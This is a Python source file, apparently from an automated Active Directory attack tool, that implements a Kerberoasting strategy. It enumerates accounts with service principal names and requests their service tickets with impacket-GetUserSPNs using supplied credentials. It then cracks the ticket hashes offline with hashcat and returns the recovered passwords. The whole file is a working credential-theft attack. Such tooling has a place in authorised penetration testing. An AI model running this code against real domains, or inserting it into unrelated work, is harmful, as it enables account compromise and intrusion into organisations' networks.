import subprocess
import os
from entities.node import Node
from entities.edge import Edge
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from strategies.exploit_strategy import ExploitStrategy
from services.enumeration import Enumerations
from services.scoring import ScoringService
from exceptions.hop_failed_error import HopFailedError


class KerberoastStrategy(ExploitStrategy):

    def __init__(self, enumerations: Enumerations, creds: dict):
        self.enumerations  = enumerations
        self.domain        = creds["domain"]
        self.dc_ip         = creds["dc_ip"]
        self.username      = creds["username"]
        self.password      = creds["password"]
        self.wordlist      = creds["wordlist"]
        self.hashcat_rules = creds.get("hashcat_rules", "rules/best64.rule")
        self.crack_timeout = int(creds.get("crack_timeout", 300))
        self.scorer        = ScoringService()

    def can_exploit(self, edge: Edge) -> bool:
        return (
            edge.goal_node.kind == NodeKind.USER
            and edge.goal_node.properties.get("hasspn", False)
            and edge.goal_node.properties.get("enabled", True)
        )

    def exploit(self, edge: Edge, attacker: Node, creds: dict) -> ExploitResult:
        return self._exploit_node(edge.goal_node)

    def run_all(self) -> list[ExploitResult]:
        candidates: dict[str, Node] = self.enumerations.get_kerberoastable_users()

        if not candidates:
            return []

        prioritized = self.scorer.prioritize(list(candidates.values()))
        results     = []

        for node in prioritized:
            try:
                results.append(self._exploit_node(node))
            except HopFailedError as e:
                results.append(ExploitResult(
                    success=False,
                    strategy="kerberoast",
                    target=node.label,
                    details=str(e),
                    severity="LOW"
                ))

        return results

    def _exploit_node(self, node: Node) -> ExploitResult:
        if not (node.kind == NodeKind.USER
                and node.properties.get("hasspn", False)
                and node.properties.get("enabled", True)):
            raise HopFailedError(f"{node.label} is not kerberoastable")

        spns        = node.properties.get("serviceprincipalnames", [])
        ticket_hash = self._request_tgs(node)
        cracked     = self._crack_hash(ticket_hash, node.sam())

        return ExploitResult(
            success=cracked is not None,
            strategy="kerberoast",
            target=node.label,
            details=f"SPNs: {spns}",
            ticket_hash=ticket_hash,
            cracked_password=cracked,
            severity="CRITICAL" if cracked else "HIGH"
        )

    def _request_tgs(self, node: Node) -> str:
        sam      = node.sam()
        out_file = f"/tmp/krb_{sam}.hash"

        cmd = [
            "impacket-GetUserSPNs",
            f"{self.domain}/{self.username}:{self.password}",
            "-dc-ip",        self.dc_ip,
            "-request-user", sam,
            "-outputfile",   out_file
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode != 0:
            raise HopFailedError(f"impacket error: {result.stderr.strip()}")
        if not os.path.exists(out_file):
            raise HopFailedError(f"No hash file for {node.label}")

        with open(out_file) as f:
            content = f.read().strip()

        if not content:
            raise HopFailedError(f"Empty hash file for {node.label}")

        return content

    def _crack_hash(self, ticket_hash: str, sam: str) -> str | None:
        hash_file = f"/tmp/krb_{sam}.hash"

        cmd = [
            "hashcat",
            "-m",  "13100",
            hash_file,
            self.wordlist,
            "-r",  self.hashcat_rules,
            "--quiet",
            "--potfile-disable"
        ]

        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=self.crack_timeout
        )

        for line in result.stdout.splitlines():
            if "$krb5tgs$" in line and ":" in line:
                return line.strip().split(":")[-1]

        return None
